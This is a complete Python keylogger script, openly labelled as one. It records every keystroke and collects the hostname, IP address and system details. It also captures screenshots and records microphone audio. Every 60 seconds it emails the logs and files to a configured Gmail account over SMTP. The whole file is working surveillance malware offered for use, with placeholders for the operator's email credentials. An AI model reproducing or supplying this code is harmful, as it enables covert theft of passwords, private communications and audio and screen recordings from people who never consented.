import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Email Configuration
EMAIL_ADDRESS = "your-email@gmail.com"  # Replace with your email
EMAIL_PASSWORD = "your-app-password"  # Replace with your email password
SMTP_SERVER = "smtp.gmail.com"  # Change to your email provider's SMTP server
SMTP_PORT = 587  # Gmail SMTP port

SEND_REPORT_EVERY = 60  # Time in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        self.running = True  # Control flag for stopping

    def append_log(self, string):
        self.log += string + "\n"

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "

        self.append_log(current_key)

        # Stop keylogger when "ESC" is pressed
        if key == keyboard.Key.esc:
            self.running = False
            return False  # Stop listener

    def send_mail(self, email, password, message, attachment_path=None):
        sender = email
        receiver = email  

        msg = MIMEMultipart()
        msg["From"] = sender
        msg["To"] = receiver
        msg["Subject"] = "Keylogger Report"

        msg.attach(MIMEText(message, "plain"))

        if attachment_path and os.path.exists(attachment_path):
            try:
                with open(attachment_path, "rb") as f:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(attachment_path)}")
                    msg.attach(part)
                print(f"Attached file: {attachment_path}")
            except Exception as e:
                print(f"Failed to attach {attachment_path}: {e}")

        try:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(email, password)
                server.sendmail(sender, receiver, msg.as_string())
                print("Email sent successfully.")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        if self.running:
            self.screenshot()  # Capture and send a screenshot
            self.microphone()  # Record and send audio
            self.send_mail(self.email, self.password, self.log)
            self.log = ""

            timer = threading.Timer(self.interval, self.report)
            timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        system_info = f"""
        Hostname: {hostname}
        IP Address: {ip}
        Processor: {plat}
        System: {system}
        Machine: {machine}
        """
        self.append_log(system_info)

    def microphone(self):
        try:
            fs = 44100
            seconds = 10  # Record for 10 seconds
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()

            audio_path = "sound.wav"
            with wave.open(audio_path, "wb") as obj:
                obj.setnchannels(2)
                obj.setsampwidth(2)
                obj.setframerate(fs)
                obj.writeframes(recording.tobytes())

            print("Microphone recording saved.")
            self.send_mail(self.email, self.password, "Microphone Recording Attached", audio_path)
        except Exception as e:
            print(f"Failed to record audio: {e}")

    def screenshot(self):
        try:
            img_path = "screenshot.png"
            img = pyscreenshot.grab()
            img.save(img_path)
            print("Screenshot captured and saved.")
            self.send_mail(self.email, self.password, "Screenshot Attached", img_path)
        except Exception as e:
            print(f"Failed to take screenshot: {e}")

    def run(self):
        print("Keylogger started. Press 'ESC' to stop.")
        
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        print("Keylogger stopped.")

# Run the keylogger
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
